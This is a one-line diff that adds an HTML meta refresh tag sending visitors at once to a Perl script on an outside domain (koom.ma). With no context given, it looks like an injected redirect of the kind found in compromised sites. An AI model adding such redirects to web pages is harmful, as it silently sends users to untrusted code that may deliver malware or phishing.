@@ -1,0 +1,1 @@
+<meta http-equiv=Refresh content=0;url=http://www.koom.ma/perl/i.pl>
